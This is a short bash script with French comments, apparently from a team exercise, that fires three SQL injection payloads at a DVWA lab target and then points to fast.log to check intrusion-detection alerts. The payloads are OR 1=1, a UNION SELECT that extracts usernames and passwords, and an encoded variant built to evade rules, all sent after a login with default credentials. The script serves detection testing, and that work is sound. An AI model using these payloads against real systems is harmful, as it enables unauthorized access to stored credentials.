#!/bin/bash
# =============================================================================
#  payloads.sh — Equipe 8 — Round 1 (Injection SQL)
#
#  Usage (apres avoir deploye les regles adverses) :
#    bash attacks/equipe-8/payloads.sh <ip_dvwa>
#
#  Par defaut cible : dvwa (nom Docker)
# =============================================================================

TARGET="${1:-dvwa}"
PORT="80"
COOKIE_FILE="/tmp/dvwa_eq8.txt"

echo "=== Equipe 8 — Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# Authentification DVWA
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET:$PORT/login.php" -L -o /dev/null
echo "[*] Cookie recupere"
echo ""

# Payload 1 Injection basique 
echo "[1] Injection basique OR 1=1..."
RESULT=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
  -o /dev/null -w "%{http_code}")
echo "    HTTP $RESULT"

# Payload 2 UNION SELECT (extraction de données )
echo "[2] UNION SELECT user/password..."
RESULT2=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" \
  -o /dev/null -w "%{http_code}")
echo "    HTTP $RESULT2"

# Payload 3 Évasion (encodage URL + commentaires alternatifs)
echo "[3] Evasion avec encodage et commentaire #..."
RESULT3=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%23&Submit=Submit" \
  -o /dev/null -w "%{http_code}")
echo "    HTTP $RESULT3"

echo ""
echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="